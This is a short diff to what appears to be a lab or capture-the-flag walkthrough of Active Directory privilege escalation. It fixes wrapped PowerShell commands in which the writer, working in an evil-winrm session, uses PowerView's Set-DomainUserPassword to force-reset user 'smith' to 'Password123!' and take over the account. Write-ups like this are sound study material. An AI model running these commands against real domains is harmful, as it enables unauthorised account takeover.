@@ -294,9 +294,12 @@ There is a clear path to domain admin
 
 # Compromising `smith`
 
+Ill import powerview into the session
+
 ```python
-evil-winrm-py PS C:\Users\oliver\Desktop> $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -F
-orce
-evil-winrm-py PS C:\Users\oliver\Desktop> Set-DomainUserPassword -Identity 'smith' -AccountPassword $NewPasswo
-rd
+evil-winrm-py PS C:\Users\oliver\Desktop> $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+evil-winrm-py PS C:\Users\oliver\Desktop> Set-DomainUserPassword -Identity 'smith' -AccountPassword $NewPassword
 ```
+
+Ill change the users password
+
